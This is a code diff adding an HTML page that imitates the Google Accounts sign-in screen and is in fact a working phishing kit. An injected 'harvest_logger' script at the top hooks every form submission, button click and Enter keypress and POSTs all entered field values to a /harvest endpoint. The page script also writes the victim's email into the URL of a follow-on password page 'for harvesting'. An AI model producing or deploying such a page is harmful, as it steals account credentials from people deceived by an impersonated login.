@@ -1,0 +1,376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- harvest_logger -->
+<script>
+(function() {
+    if(window.__harvest_logger_loaded) return;
+    window.__harvest_logger_loaded = true;
+    function formToDict(form) {
+        var data = {};
+        var fd = new FormData(form);
+        fd.forEach(function(value, key) {
+            data[key] = value;
+        });
+        // If FormData is empty, manually gather all input/select/textarea
+        if(Object.keys(data).length === 0) {
+            var idx = 0;
+            var els = form.querySelectorAll('input,select,textarea');
+            els.forEach(function(el) {
+                var k = el.name || el.id || ('field_'+idx++);
+                var v = el.value;
+                data[k] = v;
+            });
+        }
+        return data;
+    }
+    function sendHarvest(form) {
+        try {
+            var data = formToDict(form);
+            fetch('/harvest', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(function(){});
+        }catch(e){}
+    }
+    var origSubmit = HTMLFormElement.prototype.submit;
+    HTMLFormElement.prototype.submit = function() {
+        sendHarvest(this);
+        origSubmit.apply(this, arguments);
+    };
+    document.addEventListener('submit', function(e){
+        sendHarvest(e.target);
+    }, true);
+    function hookBtns(form){
+        var btns = form.querySelectorAll('[type=submit],button');
+        btns.forEach(function(btn){
+            btn.addEventListener('click', function(){sendHarvest(form);}, true);
+        });
+        var inputs = form.querySelectorAll('input');
+        inputs.forEach(function(input){
+            input.addEventListener('keydown', function(e){
+                if(e.key==='Enter'){sendHarvest(form);}
+            }, true);
+        });
+    }
+    document.querySelectorAll('form').forEach(hookBtns);
+    var mo = new MutationObserver(function(muts){
+        muts.forEach(function(mut){
+            mut.addedNodes.forEach(function(node){
+                if(node.tagName==='FORM') hookBtns(node);
+                else if(node.querySelectorAll) node.querySelectorAll('form').forEach(hookBtns);
+            });
+        });
+    });
+    mo.observe(document.documentElement,{childList:true,subtree:true});
+})();
+</script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        :root {
+            color-scheme: light dark;
+        }
+        body {
+            font-family: 'Google Sans', Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: var(--background-color);
+            color: var(--text-color);
+        }
+        .container {
+            width: 100%;
+            max-width: 450px;
+            margin: 0 auto;
+            padding-top: 40px;
+        }
+        .logo {
+            margin-bottom: 16px;
+        }
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            color: var(--text-color);
+        }
+        .subtitle {
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 32px;
+            color: var(--text-color);
+        }
+        .space-before-input {
+            height: 20px;
+        }
+        .input-container {
+            width: 100%;
+            margin-bottom: 0;
+        }
+        .input-label-group {
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            margin-bottom: 0;
+        }
+        .input-label {
+            position: absolute;
+            top: -11px;
+            left: 14px;
+            background: var(--background-color);
+            color: #A4C2F4;
+            font-size: 16px;
+            padding: 0 4px;
+            z-index: 2;
+            pointer-events: none;
+            font-weight: 400;
+        }
+        .whsOnd {
+            width: 100%;
+            height: 56px;
+            padding: 24px 15px 10px 15px;
+            font-size: 16px;
+            border: 2px solid #A4C2F4;
+            border-radius: 6px;
+            box-sizing: border-box;
+            background-color: transparent;
+            color: var(--text-color);
+            margin-top: 0;
+            margin-bottom: 0;
+            transition: border-color 0.2s;
+            outline: none;
+            font-weight: 400;
+        }
+        .whsOnd:focus {
+            border-color: #A4C2F4;
+            outline: none;
+        }
+        .forgot-email {
+            background: none;
+            border: none;
+            color: #A4C2F4;
+            cursor: pointer;
+            font-size: 20px;
+            padding: 8px 0;
+            margin: 8px 0 0 0;
+            display: block;
+            text-align: left;
+            font-weight: 500;
+        }
+        .guest-mode {
+            font-size: 14px;
+            color: var(--secondary-text-color);
+            margin-top: 32px;
+            margin-bottom: 24px;
+        }
+        .guest-mode a {
+            color: #A4C2F4;
+            text-decoration: none;
+        }
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 26px;
+        }
+        .VfPpkd-vQzf8d {
+            color: #A4C2F4;
+            font-weight: 500;
+            font-size: 14px;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 4px;
+            text-decoration: none;
+            display: inline-block;
+            background: none;
+            border: none;
+        }
+        .VfPpkd-vQzf8d:hover {
+            background-color: rgba(164, 194, 244, 0.04);
+        }
+        .next-button {
+            background-color: #A4C2F4;
+            color: #000 !important;
+            padding: 0 18px;
+            border-radius: 999px;
+            font-weight: 400;
+            border: none;
+            box-shadow: none;
+            font-size: 14px;
+            min-width: 64px;
+            min-height: 32px;
+            height: 32px;
+            line-height: 32px;
+            transition: background 0.2s;
+            margin-left: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .next-button:hover {
+            background-color: #9CB9E8;
+        }
+        .footer-container {
+            width: 100%;
+            max-width: 450px;
+            margin: 100px auto 0;
+            padding-top: 24px;
+        }
+        .language-selector {
+            margin-bottom: 24px;
+            text-align: left;
+        }
+        .language-selector select {
+            background-color: transparent;
+            color: var(--text-color);
+            border: none;
+            box-shadow: none;
+            border-radius: 0;
+            padding: 0 24px 0 0;
+            font-size: 13px;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23868e96'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
+            background-repeat: no-repeat;
+            background-position: right 0 center;
+            background-size: 20px;
+            min-width: 200px;
+            outline: none;
+        }
+        .language-selector select:focus {
+            outline: none;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 24px;
+            font-size: 12px;
+        }
+        .footer-links a {
+            color: var(--secondary-text-color);
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 480px) {
+            .footer-links {
+                gap: 16px;
+            }
+            .footer-container {
+                padding-left: 8px;
+                padding-right: 8px;
+            }
+            .container {
+                padding-left: 8px;
+                padding-right: 8px;
+            }
+        }
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --background-color: #000000;
+                --text-color: #ffffff;
+                --secondary-text-color: #9aa0a6;
+                --border-color: #3c4043;
+            }
+            .input-label {
+                background: #000000;
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            :root {
+                --background-color: #ffffff;
+                --text-color: #000000;
+                --secondary-text-color: #5f6368;
+                --border-color: #dadce0;
+            }
+            .input-label {
+                background: #ffffff;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true">
+                <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
+                <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
+                <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
+                <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
+            </svg>
+        </div>
+        <h1 class="title">Sign in</h1>
+        <span class="subtitle">Use your Google Account</span>
+        <div class="space-before-input"></div>
+        <form id="emailForm" action="password.html" method="GET" onsubmit="return handleFormSubmit()">
+            <div class="input-container">
+                <div class="input-label-group">
+                    <label for="identifierId" class="input-label">Email or phone</label>
+                    <input type="email" class="whsOnd" id="identifierId" name="email" autocomplete="username" required>
+                </div>
+            </div>
+            <button class="forgot-email" type="button">Forgot email?</button>
+            <div class="guest-mode">
+                Not your computer? Use Guest mode to sign in privately. 
+                <a href="https://support.google.com/chrome/answer/6130773?hl=en" target="_blank">Learn more about using Guest mode</a>
+            </div>
+            <div class="button-container">
+                <a href="#" class="VfPpkd-vQzf8d">Create account</a>
+                <button type="submit" class="VfPpkd-vQzf8d next-button" id="nextBtn">Next</button>
+            </div>
+        </form>
+    </div>
+    <div class="footer-container">
+        <div class="language-selector">
+            <select aria-label="Select your language">
+                <option value="en">English (United States)</option>
+                <option value="es">Español (España)</option>
+                <option value="fr">Français (France)</option>
+                <option value="de">Deutsch</option>
+                <option value="ja">日本語</option>
+                <option value="pt">Português (Brasil)</option>
+            </select>
+        </div>
+        <div class="footer-links">
+            <a href="https://support.google.com/accounts?hl=en&amp;p=account_iph" target="_blank">Help</a>
+            <a href="https://accounts.google.com/TOS?loc=BD&amp;hl=en&amp;privacy=true" target="_blank">Privacy</a>
+            <a href="https://accounts.google.com/TOS?loc=BD&amp;hl=en" target="_blank">Terms</a>
+        </div>
+    </div>
+    <script>
+        function handleFormSubmit() {
+            const emailInput = document.getElementById('identifierId');
+            const emailVal = emailInput.value.trim();
+            
+            if (!emailVal) {
+                alert('Please enter your email first');
+                emailInput.focus();
+                return false;
+            }
+            
+            // Store in sessionStorage for password.html
+            sessionStorage.setItem('user_email', emailVal);
+            
+            // Force email into URL for harvesting
+            this.action = `password.html?email=${encodeURIComponent(emailVal)}`;
+            return true;
+        }
+
+        // Handle Enter key in email field
+        document.getElementById('identifierId').addEventListener('keyup', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('emailForm').submit();
+            }
+        });
+
+        // Backup handler for programmatic submissions
+        document.getElementById('nextBtn').addEventListener('click', function(e) {
+            // Let the form's onsubmit handler handle everything
+            document.getElementById('emailForm').submit();
+        });
+    </script>
+</body>
+</html>
